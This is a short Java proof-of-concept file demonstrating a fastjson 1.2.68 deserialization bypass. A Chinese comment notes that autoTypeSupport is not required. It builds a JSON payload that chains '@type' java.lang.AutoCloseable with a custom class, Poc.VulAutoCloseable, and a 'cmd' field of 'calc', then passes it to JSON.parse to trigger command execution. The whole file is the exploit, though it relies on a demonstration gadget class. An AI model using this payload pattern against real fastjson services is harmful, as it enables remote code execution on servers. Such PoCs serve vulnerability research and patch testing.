package Poc;

import com.alibaba.fastjson.JSON;
/*
    不需要autoTypeSupport
*/
public class Poc_1_2_68 {
    public static void main(String[] args) throws Exception{
        String payload = "{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"Poc.VulAutoCloseable\",\"cmd\":\"calc\"}";
        JSON.parse(payload);
    }
}
